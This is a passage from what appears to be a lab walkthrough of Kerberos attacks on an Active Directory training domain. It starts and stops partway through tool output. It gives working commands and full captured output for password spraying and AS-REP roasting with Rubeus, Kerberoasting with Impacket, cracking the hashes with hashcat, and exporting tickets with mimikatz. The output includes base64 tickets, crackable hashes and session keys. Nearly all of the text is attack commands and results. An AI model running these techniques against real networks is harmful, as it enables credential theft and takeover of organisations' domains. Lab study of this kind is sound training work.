    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjMwNTMxMjMzMTM3WqYRGA8yMDIzMDYwMTA5MzEzN1qnERg
P
    MjAyMzA2MDcyMzMxMzdaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw
=

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  5/31/2023 4:43:24 PM
  EndTime               :  6/1/2023 2:43:24 AM
  RenewTill             :  6/7/2023 4:43:24 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZ
r
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGmdTcvQryP7A62XV5a0zneo3/LkNlsCYxNy
i
    vI1yAiG+QKhfb+Yqb2cmlvpmX/KSN7bu766MSKYV0sAJm2IKUy8RSGYho51MNyxOGu6kwIxhUEI6xEttziVwiBVBU231S5l9NvR
L
    67DIhnPARgqD70PMRzGh9RbqeknWK5ND6FRAKUBnxTJqZlro9UV4jV1uaHgReUunSGmCjkVM0EoQp380eiqz1dkh/YJmlizsV4k
n
    gB1OqA2ctbXDQN+JgvJ75/KN6uo0Sk/mKfZbn3p8wJ+XD2DBa9nlHBAFmZuqnFQq/qrykdEOb6rt9bAM6TtJGyTNAf6mAjtnLCy
S
    vISJdqdWMGt9cQpxPMJaqeL/W1lvwUSGrS7ZfxBksOzKxTU01ZSk0FL+/WJ5F8tlSlCiFwMXRtGw1ZElfmmoG/IxBk9f1TMncUg
7
    0uvUnNK0oG+TUi648ZkUzQuuUSEzBO4AOe2A4H+kFV6gMocCD1QINeUGBxbp69qzhP3A30Bhpv/kSuOsp9Bv92dKa1gI+WzCd/P
D
    tM5rBMALAsx3enI6Zid6kZ6GTAs+6r7gJMrYAfyBPlvkUPYJEI/htsqTzVaCZNcJg5vzEKLJprbipB1Jzn554yCzLs+FPmo9ACr
E
    VKAMuIa8X6rH1F7Ns7n3y25NCqUE4tBLJv04Ufli6+tK1oBtohSSw9ze6u9CGFK1tKJQiKFBhAG++0kgN8SGMxwiBg0/Jrjk9wZ
5
    70Or49MV7+wasbm4dpsCjyDEpIbyQ4tTb1d19siQA9PT5iPSbS17TrsgpKX+R5hdEMpc6UyL8GQzEFseTyZOJf5LmNgvUGz1A90
i
    dqyy2NH5P72TFgi6CmxyjSknbBIGzTWcDuEy3SMsuQ51/7Aftz+LuV+PKkez60l+L1brLdvmz0NrCvlI/jN9l/p2gm0PqTaHibK
7
    S0NHWmwGiJJawluP7GndwyAUyBsKNZrW2qVBCCnEAuI386h1aAOErrPZIoAvfW/aKF9nz5zptc6+xFiQFSmjhE/sLFBYkRb/QR2
+
    SQ03rfOErQAgVZgADWfZFGRLOqS5+krxxr6aS5b5HrdC2XaO5bQJhuzt4S43en8FhKttEEy/1FQJpilF6jeM0aKo7XaP8j1wWpz
x
    bzW2yLb0eEq9T6pr/lENc+WQwl6HAg/nfJgTHiQ0nPorHeR+9a6oKyLcfv9m5Ui9mPHmj8ClOjHc5bpmqGQRUiePBeMW/lRg1v3
3
    79GwF7q2MzOvBonRNwX3VJffWvsa6LrJSMFJON7TvTANRuwbL1rozGFKdMyRGNmZm/PGB/XYvfVPSncBsAlYIbTqjOYXlqjBbZ5
F
    4gMqGlBU2mGnTB9Tz2bjxlP9adwTGemhp7rL42JqfKTo4WGqpj1+rJM+LIvbRUotmKOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIH
g
    MIHdMIHaoCswKaADAgESoSIEIGiEiQIY7AcKANaR/hb0ydHMTM6UiRcYzJDBr4QiPoovoRIbEENPTlRST0xMRVIuTE9DQUyiGjA
Y
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjMwNTMxMjM0MzI0WqYRGA8yMDIzMDYwMTA5NDMyNFqnERg
P
    MjAyMzA2MDcyMzQzMjRaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw
=

[*] Ticket cache size: 7
[*] Sleeping until 5/31/2023 4:56:13 PM (30 seconds) for next display

```

## Brute-Forcing / Password-Spraying w/ Rubeus

```bash
Rubeus.exe brute /password:Password1 /noticket
```

### Output

```bash
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7fvc+3/+KTB+C/XJ/3F3cwNuNARhpIGaVsAtDgT1CJaBz71ETsLIx0eBr6tVgHTIxvpqc5EumKMm
      PfDrmY1LzwOxX1qNkX5NZoueLtZ7L52+YOSKzJw+jM2c6xg1SBwBmHy8UhYLcQ9YPnpxaDeqKs9uGdJ6
      CqAuyz/2fghcCY1yJpaGBioUNKd1hCh7dsb0/7njM6+Atvt9Kv4d0dgQOWjZhMP3z0P2/uYMWlAL+XgW
      +NYBIwwz5xeXyH9S29pFIzKSZfzDvaW7UCy96uyls5Dmkk0AYWm8vKqHimpiU9RNHGTXB8aKk6+nFsyn
      rix6Y9oYFiyB81hig/JNay87v3ziMEW7yZLc1SEnIIov/ghVUf5XC1KVTX6prZSzHSYvynojtqpTZlFI
      w42OMvDqrQJSz/chL9bOvE5Cvpx4kDsY8KqqEWoh7Xh7MMuYCO8gO5L43sYaV5MeWsCz0qh8GuR0VWLx
      K5cRtah/NpfN8Y13jmy/A8Lnu8CKaZQqUjDj3EOo/m8SAt7CLa2MWuWfwHQBCtsiqz+gf4REkczPx4D0
      jcKQCkhjTd1HRZuAAKmkvQ+zXemMV44AfI5I1+K0N7EQv9+7enisc/Fu0hyUx9XuxE7z11ISsvy1+ufM
      mK696L/Z8h6nvEY4Ax6c898DqR2OaTxLt69JcS6SMZu2DJHZjJuPS+4Q2kX5Ugje9xFKZ52OacL7Cpi3
      FzTU7Qt9dTPSZCEN/aN0i41x5CZTQebZZUkkXhR55tiPnO6HdQVoyK7Td+MK8Dwv4HUimYIb6HvMrWD4
      /l+MydItk3wTrJL4v/St2YW5Ygzd66js0fHFf/YArPGaNdnWWaSLG89sezCdPwOHu49Gsg3s+gFbrNKr
      mHzS4KBGn/RxlI4PxufA6ZEwzIjc19L2hBThWMQt8egbyfLBVCm3W/8wydkhhu2RVNZtWteWh7tCjp/y
      MEGjNMREdurLmYrqkycaEgATJFk3UYNgLpRYF4i88Hf/WsSW5K9TXgAhkFnubJZtil7QeFPdYaSwE0uL
      XUcmIfm8lA5gsw1lyBjbPpKTkr3Gp2STvCbdg8OsicCkYmyEtaT/J0Ys5J/1rNrFtC7JZs2hmPTI+boF
      uj9JEK2zPkBUJyw540JwTSpNTFDqvcX1J/U/UxTW1RRwUHSuTmqunWD2hM9vDkVnLtyEofIlDgQP2GFx
      Q6sCL5YYSUQiVaKB8xbQwBbicSZeplpDGLwvb5xpzRUP+EIsZ/+EYWPQ5URA5GIVY0MiwdJp0LrdFgaf
      c+ci+0zfEFqRYghcwNZWjRJWvtomk7zP4gd1mwH/rkJskSv/aubHWsfuKe0dcHLhbKOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIAthPvxARDa43Ao97chvVqQu3OuoOtgi4xPe
      a4wQB0KuoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIzMDYwMTAwMDAzN1qmERgPMjAyMzA2MDExMDAwMzdapxEYDzIwMjMwNjA4MDAwMDM3WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
[+] Done
```

### Kerberoasting w/ Impacket

```bash
sudo GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.206.195 -request
```

### Output

```bash
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 18:28:26.922527  2020-05-25 18:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 18:39:17.578393  2020-05-25 18:40:14.671872             

$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$3600e0bc8b4dfb7d85ad40759057a288$eaafc83d565b467ba5b6fd899f701fbf552f3c1edd57c6b029c7253fe383f6d41f2c2af559c6b132d8b128892c7f03e807d8ee0de8c55cf9b7af32658d21cdb2dc534412e89248618eac0f0c1a4729f27c49f1324df7ab836794281287afffd32cddf7770cae618c9f4096dd9b17a457bdbd59988ca22e4c71ab8c3f194d56738b5acf725081fbefb1d2a9fa8dc7e8bc3f37174560617218279452e518e2a77ec85850f445258720b2c44400e72231ba972b64eb47035ffc6f6ec635b1fc5410719cc2c1ec2e07f9871c40a554718a100089aca5599deedcffbf85c8e392a1baea589526757bb16697888e769686aab5a682706c94e45ee97dc7becd15a5bc330e6f3e812febfd90e95eb428e8583791e79d8908bd23819019029966b9b579d21eeeda89bf3278913cce5792b2ffb76fd0702ba9e5dcad0cad11deb5657b48359b69010111d6917fa0eb86897e51c9520dd85bfb8fffda0d4033aea5e33e547acfdaafd52081d8979a6381d8c439ee403f39a846ebfbeed551f73e4e9f7795e74e74b37c488f970e539a8814cf3eb7205c3a4c0775d3709d15bb95c60b2e9c88e873e487dc49cd10b14c1088e540c14bc0975ee5905818b405fe50d48ba4ffe0f27017721e45dc37f0779fbaf4af5dc15a275528fa9c05d84425b8aa7b51e435025c82759a03324d4ce619dd9846c058c5149cdeea4f97029a0b7fdd072fe8488303a7182cce6fb138bb0b5605e6df3a3dd34103050ee1f66534144e9961f4b8b4f7732cdf96114666bfeef1869887f1f4ba28588cf678dd93e01fe696fc077d5d5bbe0fce1902081358442f9b50b22338f2f4227d843a793f42d6df0d77e392b96f6082814268bce91c9337157f052f332d464fffa4ac60855537328d81473192273c9f4bc772cbc0fc4bde58af44eb834524da6e1469c3e36a6f4fe5a3cb63f113577e89f501139ea0debc042a087970136676c3adb9816213840ad7551116b77b7f7cb89c392d07f60bc6d0bba0f881357ca56190abc44287cb0b0ab3b2bd5ce38fb5c1fc344ebe853d1005ef3defe6d76970cb9299fbddad7d2b7e12786d2649b92b0dc3925c1fb083dad5a507f4a834962603187579052c0cdfa25169f40abf9bb880fd9bde96c76b7e0a6c0c3dbd1855449fa8e57e6ad06a9a98352b4168fbd064571a910a24a93a51a56365440c9e0bc94972fcff767177685b1cbdc31d31e734a2d107b3ae9d958bb41a0944af72e68fec4af5628333540544e629ecae101383bea2c7912f3ee5e120fd9284099fe50d75df1d236433821c641224595c40a4d0d7012f561a8c649501d0abfd2cd5b8b05592307bdbc860a031b082eb11b8b9e9134d8bf14c6726708483a6c957

$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$1ca1678c338c2411a7e93773578272a9$c04601dd8fe72b85056be4b1456f4ba595c5bef5c8d63a791c2cbac067c5b3a0ec4b06227b4ef5833f4942f5e3ad1cbe9d30a3c8eff027530f6cedab095f765d08e4fa075c1b261383acfc77c2f676ab53c30af7c810ef81980d2bbb35e89db5823c4b526714d85c79af30aa634918e8a14efc13d5c078cf8cd3eefc6f72d67d750a43b2c34b397fd8f60a507ed62f310a539ed1d978eb765bdf2253f4d31987e834d41d76d0098416b78cee0cd1647f6f8afd17b733a7c731e5a329ba8071cea7e985f4847e1d52e1d4a8ec7ddf7074e706eb7b471dea50243fb4cfad0c02aa0aabf8866d083c561043be5aeb7f59588f023c7ee8595092e16d0731c6e565d0eb4bb9e2345203aa8c565bd823793495b1e2eb2588906d85f097d7773c8b114b7c16430b868eae2c7d4de004c15a5bf350e08380ad99f0273a9d0d4e9f9ee5c0deebfea875775953e0868a3749d3ea73d21ce1aa75c67d07a5042e4f3bc197265cfd742119b591079fec898b9bef72b32ec429e5dc1ffeb7a2fb2805e7638f1f1e9d38650bbed5caa8645aae9f0703cec6ad05f80ea77e4780b73def24526bf76209ad565bc9d7ae8e568354bccfc693da1433f37687187fcb09089d156b1ed6fff5ad5642fb90039eb3be6c781e60d3656bd084f8fc3da138717604c767a9bc94c6c88298735e6681ba478132659109b1f2b5cd33e9555bc75c8d8b76169349121d4cd1670afb1fe6d99d2734c824cb71ec7f24c86798caeaca0a371d2d09906a11b82e74c4678caef590fa72ffe870c54d8c749007a10ca35b12bdd5d20353f62e625cc9a735bca77371de83a7803dcf1ab7c5b994e15dc77e95d82b3f0e09ee364ecba500564d6d1aac78cda5d304121dff7912c0fa8d829acfa29fed4d8be0a871ad8cf80b54f5987064691483276f5592d43095ead71ec517fe72aeabef69ddb68043ad791b109be2c97e43d6f3fdd55c75f109b48d1015eee6c16903270fa464a775be0eb7c5f6c021ef5f21cdb3a74aef8e0d49c49185bc405c66f6dfd84471e04a65b96630486a5326ff509ee692bc241168cfeecff8ac54180679eb1e055f3fc0e168040b47508f119094c2dbb6dde0f1a6eeb17860d15b01cd0c23ad1b39b49e3f828aca6d016308308250e5a8a835140df03f6eaa56c1e8977d409f5839070d1a73d69230bd6a547b0e1f3c1d43e6643876ddb2a7861e2a311845b4ea6f80c92d3c256d504ace7e15a18b9ce04919d2a4cb82b54f12c7a6545ea444597f0d87eeaa4a7f00aaccfcafb6d69a2b700e830b89f9be7f02b70d5da73bd5b85dac92c79c0dc202e3f09f6c4837521a63472791b222cb726f5b9f8bc0a652fe2e2b9835f4fe6ef1dcfebf3c4f2f52
```

## Hashcat Hash Cracking

- Save the above 2 hashes to separate .txt files and use hashcat 

```bash
hashcat -m 13100 -a 0 [hash.txt] [wordlist]
```

## Dumping KRBASREP5 Hashes w/ Rubeus

```bash
./Rubeus.exe asreproast
```

### Output

```bash
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users    
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::e0a1:a377:78ea:e896%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:4C1B6332CEFC974CCC3C468DE450AD83$1506ED0379BE
      8B0869437D3725359B884CF3E064FD1F169CAE40FD3E426B99ABA31599F5780861913F72CCB121EA
      65EE569BF748E9BC3120F1FC3284185363FD0609C4D451CFF78F6A77784F5E1474EC24C8EC12560C
      94F792DCE98CECF3C89B2F1FC83C991D1CDF9E4AECD9628BF9DDECFC00A800C9FE65035CBA71FA28
      09167AF1EB6EA74CDE0B7A0559B152F3C3828B80FB1AF01D2FE39C8D753826199B44CED7DE7B6030
      2AF9C74B1FDE6BC8D2081E68AB8AA7494620A56908C2A931A4A9097BC69284AE86577ACE41A632C9
      1477584CA531397397D5E9430437F2C2B8384462E9A7288A18B32D94C2076FF713D08906A0BE

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::e0a1:a377:78ea:e896%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:22A9B28133CDBB8FC7DE7A5D36C74CFB$DBB4E150459E8
      B385C646C19AB1E81C1C2B671D568D050AB27CF0C77EF5F5D3E40153574FADD0E334377CE98569E8
      32A895EB037D162FF8D932E22DF9CDC8190E436EC6AFE9D93AF563474D6AFD75E90A8091C674B68B
      243FEBCE1A07191909AD5E77519D16C1E8ED3E0402FB02F1ADBC41FA64A32E3EBB53C9EDDC88ED2C
      E6CB4ABC46EFAAFF72A2BC0C57BAAD38F468DD34BED62FC6EF118ABBAF5E59F3F64D5B1BF467CACD
      C039A8D356181D3C5D7C248277B9DC00BC74F32138A307FF8CF875AA173F74A6B12A631AAE720186
      A620E6748A03B2C3A87A55FF4CDA9EA211E94DFCE42AF4AA4C657AAD9FE4C61DEA3540121AF
```

### Hashcat the hashes dumped

- Save the above 2 hashes to separate .txt files and use hashcat 

```bash
hashcat -m 13100 -a 0 [hash.txt] [wordlist]
```

## Pass the Ticket w/ mimikatz

```bash
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

```

```bash
sekurlsa::tickets /export
``` 
- this will export all of the .kirbi tickets into the directory that you are currently in

### Output

```bash
Authentication Id : 0 ; 4097243 (00000000:003e84db) 
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 6:35:16 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ;
           Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             fe7f401fcdc9bf643149836e6c7b53683a3b79313a61963509093a183f5eff43
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e84db]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 3238869 (00000000:00316bd5)
Session           : Service from 0
User Name         : sshd_4020
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 5/31/2023 4:59:49 PM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-4020

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1949491 (00000000:001dbf33)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 5/31/2023 4:43:24 PM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:43:24 PM ; 6/1/2023 2:43:24 AM ; 6/7/2023 4:43:24 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             6884890218ec070a00d691fe16f4c9d1cc4cce94891718cc90c1af84223e8a2f
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;1dbf33]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 1915600 (00000000:001d3ad0)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/31/2023 4:43:21 PM
SID               : S-1-5-90-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1841331 (00000000:001c18b3)
Session           : Service from 0
User Name         : sshd_3904
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 5/31/2023 4:37:10 PM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-3904

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1699484 (00000000:0019ee9c)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:34:37 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:34:37 PM ; 6/1/2023 2:20:06 AM ;
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL      
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             365c80bb8e3e83e3777d7ad5d98694f7b7f15187f53260c433f5986ba82ea935
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;19ee9c]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi ! 

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1263475 (00000000:00134773)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 5/31/2023 4:31:37 PM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ? 

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:31:37 PM ; 6/1/2023 2:31:37 AM ; 6/7/2023 4:31:37 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             649f7ab1725d276b2bffd8a648010d34d4480dcc1b02e09ddbf175b47ed85bff
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;134773]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 398334 (00000000:000613fe)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:24:48 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000] 
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             f294d5ba6c459ce240985872c35a0b2c1b64fc6797d10a4c6ac2cffaa2de8524
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;613fe]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !     

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 191531 (00000000:0002ec2b)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:20:06 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

